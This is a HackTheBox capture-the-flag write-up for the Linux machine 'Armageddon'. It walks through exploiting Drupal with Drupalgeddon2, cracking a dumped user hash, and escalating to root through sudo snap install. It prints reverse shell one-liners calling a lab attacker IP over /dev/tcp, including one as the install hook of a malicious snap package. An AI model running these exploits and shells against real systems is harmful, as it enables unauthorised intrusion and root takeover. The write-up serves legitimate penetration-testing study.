# Armageddon HackTheBox Writeup
### Level: `Easy` | OS: `Linux`

## Scanning
We run nmap on all ports with scripts and software versions.

![](2.png)

## Enumeration
We access the web resource, we find a website designed in Drupal (as we had previously seen in nmap).

![](3.png)

We list the deployed version of Drupal, an attacker would manage to list public exploits to abuse vulnerabilities in this version.

## Exploitation
Here is a news from ["HackPlayers"](https://www.hackplayers.com/2018/04/llega-drupalgeddon2-rce-inyectando-en-arrays.html) where they talk about the vulnerability and the affected versions.

#####  Exploit: [drupalgeddon2](https://raw.githubusercontent.com/lorddemon/drupalgeddon2/master/drupalgeddon2.py)

### PoC

### Reverse shell code
``` bash
python drupalgeddon2.py -h http://10.10.10.233 -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```

We review the "*settings.php*" file and list the database credentials. This is highly recommended, as there is a possibility of password reuse.

So, we list the users and try the password, but it doesn't work.

We dump the DDBB data and find the hash of the Drupal user "*brucetherealadmin*".

![](10.png)

### Cracking hash
We crack the hash with **john** and **rockyou** dictionary and get the credentials in plain text.

![](11.png)

We access by **SSH** and read the flag of "*user.txt*".

![](12.png)


## Privilege Escalation
We run the command "sudo -l", we see that we can install snaps as the root user.

We search for information on Google, we see that we can create a malicious snap package and run it as the user with elevated privileges.

### PoC
![](13.png)

Great, we could read the "*root.txt*" file directly, but we would not be squeezing the most out of the machine.

So, we'll use the following lines to *create a malicious snap package* to give us a reverse shell on our kali.

```bash
COMMAND='bash -i >& /dev/tcp/10.10.14.15/555 0>&1'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/bash\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n m3n0s -s dir -t snap -a all meta
```

We set up a *python server* on our kali and transfer the file with **curl**. Now we run **snap** with **sudo**, wait to receive our reverse shell as root and read the root flag.
